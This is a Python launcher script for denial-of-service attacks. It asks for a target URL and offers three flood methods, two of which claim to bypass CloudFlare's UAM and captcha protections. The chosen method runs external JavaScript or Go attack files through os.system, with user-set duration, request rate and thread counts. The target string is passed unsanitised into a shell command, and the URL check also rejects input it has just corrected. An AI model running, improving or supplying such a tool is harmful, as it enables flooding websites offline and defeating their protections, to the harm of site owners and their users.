#!/usr/bin/env python3
import os
import time
from colorama import Fore, Style, init
init(autoreset=True)

#ui 
print(Fore.RED + Style.BRIGHT + """
 ███████████  █████████  █████ █████
░░███░░░░░░█ ███░░░░░███░░███ ░░███ 
 ░███   █ ░ ░███    ░░░  ░░███ ███  
 ░███████   ░░█████████   ░░█████   
 ░███░░░█    ░░░░░░░░███   ░░███    
 ░███  ░     ███    ░███    ░███    
 █████      ░░█████████     █████   
░░░░░        ░░░░░░░░░     ░░░░░    
                                    
""")
print(Fore.RED + "V2 FIXED — DEVELOPED BY ELLIOTPXP\n")

while True:
    target = input("Target URL → ").strip()
    if not target.startswith("http"):
        target = "https://" + target
        print(Fore.RED + Style.BRIGHT + "[!] Error: Wrong target input. Enter a valid url bro\n")
        continue
    else:
        break

print(Fore.RED + Style.BRIGHT + "\n[*] Choose a method: 1 | 2 | 3\n")
method1 = "1 - Flood + Protections/CloudFlare Non-UAM Bypass"
method2 = "2 - CloudFlare UAM/Captcha Bypass + Flood"
method3 = "3 - Super Fucking Flood"
print(f"{method1}\n{method2}\n{method3}\n")
method = input("Choose a method: ")

if method == "1":
    time_sec = input("Time sec (60-120 or more) → ").strip()
    rps = input("RPS (8-10 or more) → ").strip()
    threads = input("Threads (1-10 or more) → ").strip()
    cmd = f"node cbypass.js {target} {time_sec} {rps} {threads}"
    print(Fore.GREEN + "[*] Launching a JavaScript file...\n")
    os.system(cmd)

elif method == "2":
    time_sec = input("Time sec (60-120 or more) → ").strip()
    rate = input("Rate (8-10 or more) → ").strip()
    threads = input("Threads (1-10 or more) → ").strip()
    cookie_count = input("Cookie count (1-100 or more) → ").strip()
    cmd = f"node rawcaptcha.js {target} {time_sec} {rate} {threads} {cookie_count}"
    print(Fore.GREEN + "[*] Launching a JavaScript file...\n")
    os.system(cmd)

elif method == "3":
    time_sec = input("Time sec (60-120 or more) → ").strip()
    cmd = f"go run raw.go {target} {time_sec}"
    print(Fore.GREEN + "[*] Launching a Go file...\n")
    os.system(cmd)

else:
    print(Fore.RED + Style.BRIGHT + "[!] Invalid method selected lol\n")
